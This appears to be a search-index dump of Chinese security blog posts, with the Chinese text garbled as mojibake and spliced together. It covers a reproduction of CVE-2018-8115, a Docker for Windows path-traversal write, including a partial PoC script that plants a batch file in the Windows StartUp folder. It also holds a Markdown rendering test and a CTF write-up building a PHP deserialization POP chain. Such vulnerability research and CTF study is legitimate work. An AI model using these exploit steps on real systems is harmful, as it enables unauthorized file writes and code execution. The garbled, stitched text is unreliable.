¼å¼ä¹‹åï¼Œç°åœ¨æ¥åˆ†æä¸‹é—®é¢˜ã€‚åœ¨æ¼æ´ä½œè€…ç»™å‡ºçš„è„šæœ¬ä¸­ï¼Œåšçš„äº‹å¤§æ¦‚æœ‰å¦‚ä¸‹å‡ ä»¶ï¼š ç”Ÿæˆ demo.tar ä¸ evil.tarï¼Œdemo.tar ä¸º Dockerfile ç”Ÿæˆçš„layerä¿¡æ¯ï¼Œevil.tar ä¸ºæ¶æ„æ–‡ä»¶ï¼Œç„¶åå°†ä¸¤è€…åˆå¹¶ä¸º layer.tar ä¸Šä¼  layer.tar åˆ°ç§æœ‰ä»“åº“ï¼Œè¿™ä¸ªæ–‡ä»¶ç›¸å½“äºé•œåƒä¸­çš„ layer äº† ä¸Šä¼  config.json åˆ°ç§æœ‰ä»“åº“ï¼Œè¿™ä¸ªæ–‡ä»¶ç›¸å½“äºé•œåƒä¸­çš„ é•œåƒid.json ä¸Šä¼  manifest.json åˆ°ç§æœ‰ä»“åº“ï¼Œè¿™ä¸ªæ–‡ä»¶ç›¸å½“äºé•œåƒä¸­çš„ manifest.json å‰é¢ä¸‰æ­¥éƒ½æ˜¯å¾ˆæ­£å¸¸çš„è¿è¡Œå®Œäº†ï¼Œæœ€åä¸Šä¼  manifest.json æ—¶å‡ºé”™äº†ï¼ŒæŠ¥é”™ä¿¡æ¯å¦‚ä¸‹ï¼š { \"errors\": [ { \"code\": \"UNKNOWN\", \"message\": \"unknown error\" }, { \"code\": \"UNKNOWN\", \"message\": \"unknown error\", \"detail\": {} }, { \"code\": \"MANIFEST_BLOB_UNKNOWN\", \"message\": \"blob unknown to registry\", \"detail\": \"sha256:bce2fbc256ea437a87dadac2f69aabd25bed4f56255549090056c1131fad0277\" }, { \"code\": \"UNKNOWN\", \"message\": \"unknown error\" }, { \"code\": \"UNKNOWN\", \"message\": \"unknown error\", \"detail\": {} }, { \"code\": \"MANIFEST_BLOB_UNKNOWN\", \"message\": \"blob unknown to registry\", \"detail\": \"sha256:cb1aafb7147372cc64faa070b94a893b8cd2e3de3a0e8001dc225c627d991c58\" } ] } å…¶ä¸­æœ‰ MANIFEST_BLOB_UNKNOWN é”™è¯¯ï¼Œæ ¹æ®å®˜æ–¹èµ„æ–™ï¼Œå¾—çŸ¥è¯¥é”™è¯¯æ˜¯æ‰¾ä¸åˆ° blobï¼Œä¹Ÿå°±æ˜¯æ‰¾ä¸åˆ°å¯¹åº”çš„ layer ä¿¡æ¯ï¼Œå¯¼è‡´ç§æœ‰ä»“åº“æ ¹æ® config.json å’Œ manifest.json æ„å»ºé•œåƒæ—¶å¤±è´¥äº†ã€‚ å¤§æ¦‚çŸ¥é“åŸå› ä¹‹åï¼Œä½†æ— æ³•ç»§ç»­äº†ã€‚é¦–å…ˆæ— æ³•ç¡®å®šåˆ°åº•æ˜¯ä¸æ˜¯ä¸Šé¢åˆ†æçš„é”™è¯¯åŸå› ï¼Œå› ä¸ºä»ä¸Šé¢çš„æŠ¥é”™ä¿¡æ¯æ¥çœ‹ï¼Œæœ‰å¾ˆå¤šä¸ªé”™è¯¯ä¿¡æ¯ï¼Œæ‰¾ä¸åˆ° blob åªæ˜¯å…¶ä¸­çš„ä¸€ä¸ªã€‚å…¶æ¬¡å¦‚æœçœŸçš„æ˜¯æ‰¾ä¸åˆ° blob çš„ç¼˜æ•…ï¼Œé‚£åº”è¯¥æŠŠ manifest.json ä¿¡æ¯ä¸­çš„ä¸¤ä¸ª blob ä¼ ä¸Šå»å°±è¡Œäº†ï¼Œä½†æ˜¯è¿™ä¸¤ä¸ª blob å¤ªå¤§äº†ï¼Œéœ€è¦ç”¨å®˜æ–¹çš„åˆ†å—ä¼ è¾“ APIï¼Œä½¿ç”¨èµ·æ¥å¤ªè´¹åŠ²äº†ã€‚ å› ä¸ºä¸Šè¿°åŸå› ï¼Œåœ¨è¿™é‡Œå¡äº†å¾ˆä¹…ï¼Œåœ¨è¿™æœŸé—´å­¦ä¹ äº†ä¸Šé¢çš„ Docker é•œåƒå­˜å‚¨çš„çŸ¥è¯†ã€‚å­¦å¾—å·®ä¸å¤šçš„æ—¶å€™ï¼Œå›è¿‡å¤´ä¸€æƒ³ï¼Œæ˜¯ä¸æ˜¯å¯ä»¥ä¸ç”¨è¿™ç§æ–¹å¼å®ç°æ¼æ´æ”»å‡»å‘¢ï¼Ÿäºæ˜¯è¯¦ç»†çŒœæµ‹äº†ä¸‹æ¼æ´åŸç†ï¼Œä½œè€…å¤ç°æ¼æ´ä½¿ç”¨çš„æ˜¯ docker pullï¼Œpull ä¹‹åå³å¯çœ‹åˆ°æ¶æ„æ–‡ä»¶è¢«å†™å…¥äº†ç³»ç»Ÿï¼Œè¿™é‡Œæ€è€ƒä¸€ä¸‹ä¸ºä»€ä¹ˆèƒ½è¾¾åˆ°è¿™ä¸ªæ•ˆæœï¼Œæ¨æµ‹åœ¨ä½¿ç”¨ docker pull å‘½ä»¤æ—¶ä¼šå°†é•œåƒå­˜å‚¨åœ¨æœ¬åœ°ï¼ˆç»è¿‡åé¢çš„å­¦ä¹ éªŒè¯çš„ç¡®æ˜¯è¿™æ ·ï¼‰ï¼Œç„¶åå­˜å‚¨çš„æ—¶å€™æœªå¤„ç†å¥½å¯¼è‡´äº†æ¼æ´çš„äº§ç”Ÿã€‚çŒœåˆ°è¿™é‡Œä¹‹åï¼Œå†æƒ³åˆ° docker load ä¹Ÿå¯ä»¥å¯¼å…¥é•œåƒï¼Œé‚£æ˜¯ä¸æ˜¯ç”¨ docker load ä¹Ÿèƒ½å®ç°è¿™ä¸ªæ¼æ´æ•ˆæœå‘¢ï¼Ÿè¯´å¹²å°±å¹²ï¼Œdocker load éœ€è¦ä¸€ä¸ª tar çš„é•œåƒï¼Œé‚£å°±å¯ä»¥æ„é€ ä¸€ä¸ªæ¶æ„é•œåƒï¼Œç„¶å docker load è¿™ä¸ªé•œåƒï¼Œæ¥éªŒè¯çŒœæƒ³ã€‚ è¿™ä¸ªé•œåƒè¯¥å¦‚ä½•æ„é€ å‘¢ï¼Œå…¶å®å¯ä»¥å‚ç…§æ¼æ´ä½œè€…çš„åšæ³•ã€‚ä»æ¼æ´ä½œè€…çš„è„šæœ¬ä¸Šæ¥çœ‹ï¼Œå…¶å®ä»–ä¹Ÿæ˜¯ä½¿ç”¨çš„æ˜¯ NanoServer é•œåƒï¼Œç„¶åå†åŸæœ‰çš„ä¸¤ä¸ª layer ä¸Šå¤šæ·»åŠ äº†ä¸€å±‚ï¼Œå°±æ˜¯ä»–è‡ªå·±æ„é€ çš„æ¶æ„æ–‡ä»¶é‚£ä¸€å±‚ï¼Œæ‰€ä»¥æˆ‘è¿™é‡Œä¹Ÿæ˜¯æ¨¡æ‹Ÿçš„ä»–çš„åšæ³•ï¼Œå†åŸæœ‰åŸºç¡€ä¸Šå†æ·»åŠ ä¸€å±‚ï¼ŒæŠŠæ¶æ„æ–‡ä»¶æ·»åŠ æˆæ–°çš„ä¸€å±‚ï¼Œç„¶åæ›´æ”¹ç›¸åº”çš„é…ç½®ä¿¡æ¯å³å¯ã€‚ é¦–å…ˆå°†æ¼æ´ä½œè€…è„šæœ¬é‡Œç”Ÿæˆçš„æ¶æ„æ–‡ä»¶ tar åŒ…ç»™å¯¼å‡ºæ¥ï¼Œè„šæœ¬å¦‚ä¸‹ï¼š #!/bin/bash write_base_layer() { # Tar containing hive files and dummy Dockerfile base64 -d \u003c\u003c'EOF' | gunzip -c H4sIANXIjFoAA+3d3W7bdBjHcbdaQYoYTGy89MyHcNL43elBQU6bqhUr6QtjVEJDJnOyqC9Bjrt2 HO0SuAkkBBfADXDCMTfAEadcQrFju9ip2yWd46zx9yM1cfz4n3hOn7/n6Kdm2z7bcOynjttfkqrr 3UOnL+ROCl11LymaKsiqf6uokiTrgiQrmqkL4ln+u3LZSd+zXX9XXvd5hv9xt4RWEx9u1q3d1Y3N rxtLLdexvW7v2OseOSuyLi8rkqLK5pKumrWa4b87FUUXt/Yeb3651ny8t9T2f19sz3NXZKOiSqJ9 9TC/2rq2enR1ddqHaKZNqOVTJEm7tv+D5XT/S4qkCqI+4f0aKHn/D97/6nbyLLDWax04btDbOb3G q+Z/XVUS77/sv/+arsnM/0VQR5j/1StmfVWpKLKaqLj2af/pirVjNTr1Hct3YMXWBrd1qxM+rO8N 7jqDxzuNaKNH0dq6v3Yn2rBjVU8bbctqrEYbrW8Gt6tW+Nh/nahej+uN6DXWrdWqtbuVfP6H0cK+ 9cWBv5OX9udZ8LiiXDqVqdknMMOUzWU5OCteOoGpt+S0FfZ/7i2f4s/n18//ujHU/4qi+/1fSBOV vP/Xd5tb4lG35fb6vbZXPbaPe33Hfe64dyt3K6vN7X3x/98NsTrtvUXeUmf+je7zN+T6T5c5/xeC 679ym1DLp9zk+k82uf4rwuD9H7r+c9r2yaH3yP9/wHdrzqFnv+5rjD//G5LG53+FGHH+12TTqBlX zv/+lWDm/H8xLHP+T1Yvz/8X1WkfopkW9n/uLZ9y/fWfkjH/q3rQ/1z/TZ7rdNpz/v1cYl2w/FZi WQwW7qW3mZT5V9Sb7d1OEftRBov39bmff/vwyb+//sUhBQAAAIAZ9+z77vFg4V52/Zfz8/PjA1H4 84+3L64T/VXncf08Ei+fDdWT7vg/u83mV8HyN/42/QNBCLYPfoIn/mlwf+flD/79y2jMAyH4TODb wVhh/oHwufCeMBderS68P1j3cbgu/OBgQfRvxPlw20V/ZLRteJtet/BOUBgaN/z473evPXwAAAAA ANwKGfmvPfso3xDI+PkvTdUU8l9FGDX/pZh6TRk//xUPy85/JaoZ+a+4Ou1DNNPC/s+95VPGz38p UtD/5L8mj/xXeQX5r/nfPyL/BQAAAAAlQP4rPY78FwAAAABgFmXlv5zWidv1XuSWCBk//6VrKn// sRCj5r9UU5PM8fNf8bDs/FeimpH/iqvTPkQzLcp/5d3yKTf4+1+yyt9/LgT5r/IK8l//7C+S/wIA AACAEiD/lR5H/gsAAAAAMIuy8l+9tndqu85U81+yRv6rCKN+/69RW9aWx85/XQzL/v7fRDXj+3/j 6rQP0UyL8l95t3zKTfJfQf+T/5o88l/lFeS/Pv3sPvkvAAAAACgB8l/pceS/AAAAAACzKCv/9aLv OXl+H9wN8l+yZJD/KsKo+S+zVjPU8fNf8bDs/FeimpH/iqvTPkQzLcp/5d3yKTf4/kcj6H/yX5NH /qu8gvzXJz9+QP4LAAAAAEqA/Fd6HPkvAAAAAAAAAAAAAAAAAAAAAG+q/wA9MZkjAPAAAA== EOF } write_layer() { write_base_layer \u003e ./demo.tar python3 -c ' import sys import time import tarfile import tempfile import struct startupfile = \\ \"ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp/evil.bat\" with tempfile.NamedTemporaryFile() as script, \\ tarfile.open(sys.argv[1], \"w\", format=tarfile.PAX_FORMAT) as tar: # Generate new digest every time script.write(\"echo Hello World {}\\r\\npause\\r\\n\".format(time.time()).encode(\"ascii\")) script.flush() tar.add(script.name, arcname=\"Files/script.bat\") # Hardlink for startup script info = tarf","date":"2020-09-15","objectID":"/2020/09/cve-2018-8115-analysis/:4:2","tags":["æ¼æ´å¤ç°"],"title":"CVE-2018-8115 æ¼æ´å¤ç°","uri":"/2020/09/cve-2018-8115-analysis/"},{"categories":["æœ‰è¶£çš„æ¸—é€æµ‹è¯•"],"content":"æœ€ç»ˆè§£å†³ é€šè¿‡ä¸Šé¢çš„æ“ä½œï¼Œæœ¬åœ° load æ–¹å¼æ˜¯å¯ä»¥è§¦å‘æ¼æ´çš„ï¼Œç°åœ¨å†å›è¿‡å¤´æ¥çœ‹çœ‹ pull æ—¶çš„æ¼æ´è§¦å‘ã€‚è¿™ä¸€æ­¥å¤±è´¥çš„åŸå› ä¸Šé¢ä¹Ÿè®²åˆ°äº†ï¼Œæ— éå°±æ˜¯ Registry æ— æ³•è¯†åˆ«æˆ‘ä»¬ä¼ ä¸Šå»çš„ config.json ä¸ manifest.jsonï¼Œè§£å†³è¿™ä¸ªé—®é¢˜è¿˜æ˜¯å¾—å¤šçœ‹çœ‹å®˜æ–¹æ–‡æ¡£ï¼Œæˆ‘åœ¨è¿™é‡ŒèŠ±äº†å¾ˆå¤šæ—¶é—´ï¼Œç»“åˆç½‘ä¸Šçš„èµ„æ–™ï¼ŒæŸä¸€å¤©çªç„¶æƒ³åˆ°ï¼Œæ—¢ç„¶æç¤ºå¦ä¸¤ä¸ª blob æ‰¾ä¸åˆ°ï¼Œé‚£æˆ‘é…ç½®æ–‡ä»¶ä¸­ä¸å†™å®ƒä»¬ä¸å°±å®Œäº†ï¼Œconfig.json ä¸ manifest.json é‡Œé¢çš„ blob å°±åªå†™è‡ªå·±æ„é€ çš„æ¶æ„æ–‡ä»¶é‚£ä¸€å±‚å°±è¡Œäº†ï¼Œäºæ˜¯ä¿®æ”¹åçš„é…ç½®æ–‡ä»¶å˜æˆäº†è¿™æ ·ï¼š \" å¯ä»¥çœ‹åˆ°å…¶å®å°±æ˜¯ config.json ä¸ manifest.json ä¸­å¤šä½™çš„é•œåƒå±‚è¢«åˆ æ‰äº†ï¼Œåˆ äº†ä¹‹åæŒ‰ç…§å¤ç°æ¼æ´çš„æ­¥éª¤èµ°ï¼Œå°±æˆåŠŸä½¿ç”¨ pull å®ç°äº†æ¼æ´æ”»å‡»ã€‚ ","date":"2020-09-15","objectID":"/2020/09/cve-2018-8115-analysis/:4:3","tags":["æ¼æ´å¤ç°"],"title":"CVE-2018-8115 æ¼æ´å¤ç°","uri":"/2020/09/cve-2018-8115-analysis/"},{"categories":["æœ‰è¶£çš„æ¸—é€æµ‹è¯•"],"content":"END å…¶å®å¤§æ¦‚çš„æ¼æ´åŸç†ç»è¿‡å¤ç°ä¸ç½‘ä¸Šçš„èµ„æ–™å­¦ä¹ ï¼Œäº†è§£å¾—å·®ä¸å¤šäº†ã€‚å¤§æ¦‚å°±æ˜¯ Docker å°†é•œåƒå­˜å‚¨åœ¨æœ¬åœ°æ—¶ï¼Œéœ€è¦å°† layer å†…çš„æ–‡ä»¶æ ¹æ®å®ƒçš„è·¯å¾„è§£å‹åˆ°æœ¬åœ°ï¼Œä½†ç”±äºå¯¹è·¯å¾„å¤„ç†çš„æœ‰é—®é¢˜ï¼Œç›´æ¥ä½¿ç”¨åŒ…å« ../ çš„è·¯å¾„è§£å‹äº†æ–‡ä»¶ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥æ§åˆ¶æ–‡ä»¶åˆ›å»ºçš„è·¯å¾„ï¼Œä»è€Œå®ç°ä»»æ„æ–‡ä»¶å†™å…¥ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™å¹¶ä¸æ˜¯ Docker çš„é—®é¢˜ï¼Œè€Œæ˜¯å¾®è½¯æä¾›çš„ API æ¥å£æœ‰é—®é¢˜ï¼Œæ‰€ä»¥è¯¥æ¼æ´ä¹Ÿåªå­˜åœ¨ä¸ Docker for Windows ä¸Šã€‚ æŒ‰ç…§åˆ†ææµç¨‹ï¼Œç°åœ¨åº”è¯¥åˆ†æä¸€æ³¢ä»£ç ï¼Œå¼„æ¸…æ¥šå…·ä½“å‡ºç°é—®é¢˜çš„æ¼æ´ç‚¹ï¼Œä½†æ— å¥ˆå¯¹ Go è¯­è¨€çš„ä¸å¤ªç†Ÿï¼Œè¿™ç§å¤§é¡¹ç›®çš„æºç åˆå¾ˆå¤æ‚ï¼Œæ‰€ä»¥ç°åœ¨çš„æ°´å¹³è¿˜æ— æ³•å¯¹å…¶è¿›è¡Œæºç åˆ†æï¼Œè¿™é‡Œæ€»ç»“äº†ä¸‹é¢å‡ ä¸ªé“¾æ¥ï¼Œå¯ä»¥å‚è€ƒå‚è€ƒï¼š Docker æœªä¿®å¤æ¼æ´çš„ç‰ˆæœ¬ï¼š\u003c= v18.03.1-ce-rc1 Docker æ¼æ´ç‰ˆæœ¬çš„ç›¸é‚» tagï¼šhttps://github.com/moby/moby/tags?after=v18.06.0-ce-rc1 å¾®è½¯å¼€å§‹ä¿®å¤æ¼æ´çš„ commitï¼šhttps://github.com/microsoft/hcsshim/commit/79062a5b985d24ef42a4252a1b63a93ec450e407?branch=79062a5b985d24ef42a4252a1b63a93ec450e407\u0026diff=split# hcsshim v0.6.8~v0.6.10 ä¹‹é—´çš„å·®å¼‚ï¼šhttps://github.com/microsoft/hcsshim/compare/v0.6.8...v0.6.10 é•œåƒå­˜å‚¨æºç åˆ†æï¼šhttps://www.infoq.cn/article/docker-source-code-analysis-part11 ","date":"2020-09-15","objectID":"/2020/09/cve-2018-8115-analysis/:5:0","tags":["æ¼æ´å¤ç°"],"title":"CVE-2018-8115 æ¼æ´å¤ç°","uri":"/2020/09/cve-2018-8115-analysis/"},{"categories":["æœ‰è¶£çš„æ¸—é€æµ‹è¯•"],"content":"å‚è€ƒé“¾æ¥ å‚è€ƒé“¾æ¥ æ¼æ´å‘ç°è€…å®˜æ–¹ Pocï¼šhttps://hansmi.ch/articles/2018-04-windows-hcsshim-security#poc Docker å®˜æ–¹å‘½ä»¤è¯´æ˜ï¼š https://docs.docker.com/engine/reference/commandline/save/ https://docs.docker.com/engine/reference/commandline/load/ Docker Registry å®˜æ–¹æ–‡æ¡£ï¼š https://docs.docker.com/registry/spec/api/ https://docs.docker.com/registry/spec/manifest-v2-2/ Docker æ­å»º registryï¼š https://uzshare.com/view/793256 https://yeasy.gitbook.io/docker_practice/repository/registry Docker çš„ Pull Digest å’Œ Image IDï¼šhttps://developer.aliyun.com/article/57752 Docker é•œåƒå­˜å‚¨è¯¦ç»†åˆ†æï¼šhttps://www.cnblogs.com/sparkdev/p/9121188.html Docker é•œåƒæ ¼å¼è§„èŒƒï¼šhttps://ying-zhang.github.io/yi/2017/x-docker-image-spec-v1.2/ ","date":"2020-09-15","objectID":"/2020/09/cve-2018-8115-analysis/:6:0","tags":["æ¼æ´å¤ç°"],"title":"CVE-2018-8115 æ¼æ´å¤ç°","uri":"/2020/09/cve-2018-8115-analysis/"},{"categories":["æ‚ä¸ƒæ‚å…«"],"content":"æœ€è¿‘ç”±äºæƒ³æ¢ä¸€ä¸ªç¬”è®°è½¯ä»¶ï¼Œéœ€æµ‹è¯•ç¬”è®°è½¯ä»¶çš„ Markdown è¯­æ³•æ˜¯å¦å®Œå¤‡ï¼Œæ‰€ä»¥åˆ—ä¸¾äº†å¤§éƒ¨åˆ†è‡ªå·±å¸¸ç”¨çš„ Markdown è¯­æ³•ï¼Œä»¥ä¾¿å¤åˆ¶è¿›è¡Œæµ‹è¯•ï¼Œå¦‚ä¸‹ï¼š # ç›®å½•ç´¢å¼•æµ‹è¯• [toc] --- # æ ‡é¢˜æµ‹è¯• # è¿™æ˜¯ H1 æ ‡é¢˜ ## è¿™æ˜¯ H2 æ ‡é¢˜ ### è¿™æ˜¯ H3 æ ‡é¢˜ #### è¿™æ˜¯ H4 æ ‡é¢˜ ##### è¿™æ˜¯ H5 æ ‡é¢˜ ###### è¿™æ˜¯ H6 æ ‡é¢˜ --- # å¼•ç”¨å—æµ‹è¯• \u003e è¿™æ˜¯ç¬¬ä¸€è¡Œå¼•ç”¨å— \u003e è¿™æ˜¯ç¬¬äºŒè¡Œå¼•ç”¨å— \u003e \u003e è¿™æ˜¯è·¨è¡Œå¼•ç”¨å— \u003e --- # åˆ—è¡¨æµ‹è¯• * æ— åºåˆ—è¡¨ 1 * æ— åºåˆ—è¡¨ 2 * æ— åºåˆ—è¡¨ 3 1. æœ‰åºåˆ—è¡¨ 1 2. æœ‰åºåˆ—è¡¨ 2 3. æœ‰åºåˆ—è¡¨ 3 --- # ä»»åŠ¡åˆ—è¡¨æµ‹è¯• - [ ] æœªå®Œæˆçš„åˆ—è¡¨ 1 - [ ] æœªå®Œæˆçš„åˆ—è¡¨ 2 - [x] å·²å®Œæˆçš„åˆ—è¡¨ 1 - [ ] æœªå®Œæˆçš„åˆ—è¡¨ 3 --- # ä»£ç å—æµ‹è¯• è¡Œå†…ä»£ç ï¼š`\u003ch1\u003eHello, World!\u003c/h1\u003e` ä»£ç å—ï¼šä¸»è¦æŸ¥çœ‹é«˜äº® HTML ```html \u003ch1\u003eHello, World!\u003c/h1\u003e ``` Python ```python print(\"Hello, World!\") ``` Java ```java System.out.println(\"Hello, World!\"); ``` C ```c printf(\"Hello, World!\"); ``` C++ ```c++ std::cout \u003c\u003c \"Hello, World!\"; ``` JavaScript ```javascript \u003cscript\u003econsole.log(\"Hello, World!\")\u003c/script\u003e ``` Go ```go fmt.Println(\"Hello, World!\") ``` Shell ```shell echo \"Hello, World!\" ``` --- # è¡¨æ ¼æµ‹è¯• | ç¬¬ä¸€ä¸ªè¡¨å¤´ | ç¬¬äºŒä¸ªè¡¨å¤´ | | ------------- | ------------- | | ç¬¬ä¸€è¡Œç¬¬ä¸€åˆ— | ç¬¬ä¸€è¡Œç¬¬äºŒåˆ— | | ç¬¬äºŒè¡Œç¬¬ä¸€åˆ— | ç¬¬äºŒè¡Œç¬¬äºŒåˆ— | --- # æ°´å¹³çº¿æµ‹è¯• --- --- # é“¾æ¥æµ‹è¯• è¿™ä¸ª [é“¾æ¥](# \"æˆ‘æ˜¯é“¾æ¥æç¤º\") æœ‰æç¤ºã€‚ è¿™ä¸ª [é“¾æ¥](#) æ²¡æœ‰æç¤ºã€‚ --- # å›¾ç‰‡æµ‹è¯• è¿™ä¸ªå›¾ç‰‡æ²¡æœ‰æç¤ºã€‚ ![](https://www.baidu.com/favicon.ico) è¿™ä¸ªå›¾ç‰‡æœ‰æç¤ºã€‚ ![æˆ‘æ˜¯ä¸‹æ–¹æç¤º](https://www.baidu.com/favicon.ico \"æˆ‘æ˜¯é¼ æ ‡æ”¾ç½®æç¤º\") --- # å­—ä½“æµ‹è¯• æˆ‘æ˜¯æ™®é€šå­—ä½“ **æˆ‘æ˜¯ç²—ä½“** *æˆ‘æ˜¯æ–œä½“* ~~æˆ‘æ˜¯åˆ é™¤çº¿~~ --- # Emoji æµ‹è¯• æˆ‘æ˜¯ç¬‘è„¸ğŸ˜„ --- # HTML æµ‹è¯• \u003cspan style=\"color:red\"\u003eè¿™æ˜¯çº¢è‰²çš„ HTML æ–‡æœ¬\u003c/span\u003e ","date":"2020-09-06","objectID":"/2020/09/note-software-test/:0:0","tags":[],"title":"ç¬”è®°è½¯ä»¶æµ‹è¯•","uri":"/2020/09/note-software-test/"},{"categories":["CTF"],"content":"å¼ºç½‘æ¯2020","date":"2020-08-24","objectID":"/2020/08/qwb-2020-writeup/","tags":["å¼ºç½‘æ¯"],"title":"å¼ºç½‘æ¯2020éƒ¨åˆ†WriteUp","uri":"/2020/08/qwb-2020-writeup/"},{"categories":["CTF"],"content":"MISCâ€”â€”ç­¾åˆ° æ‰“å¼€é¢˜ç›®å³å¯çœ‹åˆ°flag \" ","date":"2020-08-24","objectID":"/2020/08/qwb-2020-writeup/:1:0","tags":["å¼ºç½‘æ¯"],"title":"å¼ºç½‘æ¯2020éƒ¨åˆ†WriteUp","uri":"/2020/08/qwb-2020-writeup/"},{"categories":["CTF"],"content":"å¼ºç½‘å…ˆé”‹â€”â€”webè¾…åŠ© æ‰“å¼€é¢˜ç›®ï¼Œä¸‹è½½é™„ä»¶æºç ï¼Œå…±æœ‰ 4 ä¸ªæ–‡ä»¶ï¼Œå…¶ä¸­ index.php ä¸ play.phpï¼Œæ˜¯åºåˆ—åŒ–ä¸ååºåˆ—åŒ–çš„æ‰§è¡Œæ–‡ä»¶ï¼Œclass.php æ˜¯ç±»æ–‡ä»¶ï¼Œcommon.php æ˜¯å·¥å…·æ–‡ä»¶ã€‚ åœ¨index.phpä¸­ï¼Œæ¥æ”¶ä¸¤ä¸ªå‚æ•°å¹¶ç”Ÿæˆå¯¹è±¡ï¼Œæœ€åå°†å¯¹è±¡ä¿¡æ¯ç»è¿‡å¤„ç†åå­˜è¿›æ–‡ä»¶ä¸­ï¼š \" åœ¨play.phpä¸­ï¼Œè¯»å–æ–‡ä»¶å†…å®¹ï¼Œå¹¶ç»è¿‡æ£€æŸ¥å’Œå¤„ç†åï¼Œååºåˆ—åŒ–æˆå¯¹è±¡ï¼š \" åœ¨class.phpä¸­ï¼Œå­˜åœ¨å‡ ä¸ªç±»çš„å®šä¹‰ï¼Œå…·ä½“åˆ†æå¦‚ä¸‹ï¼š jungleç±»ï¼šè¯»å–flagçš„ç±» KS()ï¼šæ‰§è¡Œç³»ç»Ÿå‘½ä»¤è¯»å–äº†flag __toString()ï¼šè°ƒç”¨äº† KS()ã€‚å› ä¸º __toString() çš„ç‰¹æ€§ï¼Œå½“è¯¥ç±»çš„å¯¹è±¡è¢«å½“å­—ç¬¦ä¸²è¿›è¡Œå¤„ç†æ—¶ï¼Œéƒ½ä¼šè°ƒç”¨ __toString() ï¼Œä¾‹å¦‚echo new jungle()ï¼Œå½“ç„¶é™¤äº†echoï¼Œè¿˜æœ‰å…¶ä»–æ–¹æ³•ä¹Ÿèƒ½è§¦å‘è°ƒç”¨ __toString()ï¼Œå¦‚strlen()ã€strstr()ç­‰ç­‰ jungle ç±»æ˜¯ä¸€ä¸ªå…³é”®ç±»ï¼Œå…³ä¹åˆ°æ˜¯å¦èƒ½è¯»å–flagï¼Œåœ¨è¿™ä¸ªç±»ä¸­ï¼Œæƒ³è¦è°ƒç”¨ KS() è¯»å–flagï¼Œå°±å¾—åˆ©ç”¨ __toString() çš„ç‰¹æ€§ï¼Œè®© jungleç±»å¯¹è±¡ è¢«å½“ä½œå­—ç¬¦ä¸²å¤„ç†ï¼Œå³å¯è¯»å–flag midsoloç±»ï¼šè§¦å‘ jungleç±»__toString() çš„ç±» Gank()ï¼šå°† $this-\u003ename è¿›è¡Œäº† stristr() åˆ¤æ–­ __invoke()ï¼šè°ƒç”¨äº† Gank() __wakeup()ï¼šç»™ $this-\u003ename èµ‹å€¼ä¸ºå­—ç¬¦ä¸² åœ¨ midsolo ç±»ä¸­ï¼Œå…³é”®çš„åœ°æ–¹åœ¨äº Gank() æ–¹æ³•ä¸­çš„ stristr() åˆ¤æ–­ã€‚æ ¹æ®ä¸Šé¢ jungle ç±»çš„åˆ†æï¼Œå¦‚æœè¿™é‡Œ $this-\u003ename ä¸º jungleç±»å¯¹è±¡ æ—¶ï¼Œé‚£ä¹ˆå°±ä¼š è°ƒç”¨jungleç±»çš„__toString()ï¼Œä»è€Œè°ƒç”¨ KS() è¯»å–åˆ°flag è€Œåœ¨ __invoke() æ–¹æ³•ï¼Œè°ƒç”¨äº† Gank()ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå½“ midsoloçš„ç±»å¯¹è±¡è¢«å½“æˆæ–¹æ³•è°ƒç”¨ æ—¶ï¼Œå³å¯è°ƒç”¨ Gank()ï¼Œå¦‚ä¸‹ï¼š \u003c?php $obj = new midsolo(); $obj(); ?\u003e æœ€å __wakeup() ä¸­ï¼Œç»™ $this-\u003ename èµ‹äº†å€¼ï¼Œå¦‚æœ æƒ³è®©$this-\u003enameä¸ºjungleç±»å¯¹è±¡çš„è¯ï¼Œå°±å¾—ç»•è¿‡__wakeup() topsoloç±»ï¼šè°ƒç”¨midsoloç±»å¯¹è±¡ çš„ç±» TP()ï¼šåˆ¤æ–­ $this-\u003ename æ˜¯å¦ä¸º function æˆ– object ï¼Œå¹¶ä¸”å»æ‰§è¡Œå®ƒ __destruct()ï¼šææ„æ–¹æ³•ï¼Œä¼šè°ƒç”¨ TP() åœ¨ topsolo ç±»ä¸­ï¼Œå…³é”®ç‚¹å°±åœ¨äº TP()ï¼Œä¼šå»æ‰§è¡Œ $this-\u003ename()ï¼Œæ ¹æ®ä¸Šé¢ midsolo ç±»çš„åˆ†æï¼Œå¦‚æœ $this-\u003enameèµ‹å€¼ä¸º midsolo ç±»å¯¹è±¡ï¼Œé‚£ä¹ˆå°±å¯è°ƒç”¨ midsolo ç±»çš„ __invoke() ä¸ Gank() playerç±»ï¼šå¯ä»¥å®é™…æ§åˆ¶çš„ç±» player ä¸ºå…¥å£ç±»ï¼Œä¸¤ä¸ªæˆå‘˜å˜é‡å¯æ§åˆ¶ï¼Œå¯ä»¥å°†æˆå‘˜å˜é‡èµ‹å€¼ä¸º topsolo ç±»å¯¹è±¡ï¼Œè¿™æ ·å°±èƒ½ä¾æ¬¡è°ƒç”¨ä¸Šé¢çš„ç±»æ–¹æ³•äº† æ ¹æ®ä¸Šé¢çš„åˆ†æï¼Œå…¶å®å·²ç»å¯ä»¥çœ‹å‡ºç‚¹ç«¯å€ªäº†ï¼Œå¯ä»¥æ ¹æ®ä¸Šé¢çš„ç±»æ¥æ„é€ ä¸€ä¸ªPOPé“¾ï¼Œè·å–flagï¼Œå¦‚ä¸‹ï¼š \u003c?php @error_reporting(0); require_once \"common.php\"; require_once \"class.php\"; $jungle = new jungle(); $midsolo = new midsolo($jungle); $topsolo = new topsolo($midsolo); $player = new player('aaa', $topsolo); ?\u003e æœ€åçš„common.phpï¼Œå­˜åœ¨ä¸‰ä¸ªæ–¹æ³•ï¼šread()ã€write()ã€check() \" å…¶ä¸­ write() åœ¨åºåˆ—åŒ–çš„æ—¶å€™è°ƒç”¨ï¼Œå°†0x00*0x00æ›¿æ¢æˆ\\0*\\0ï¼Œè€Œ read() åˆ™ç›¸åï¼Œåœ¨ååºåˆ—åŒ–çš„æ—¶å€™è°ƒç”¨ï¼Œå°†\\0*\\0æ›¿æ¢æˆ0x00*0x00ï¼Œè€Œ check() 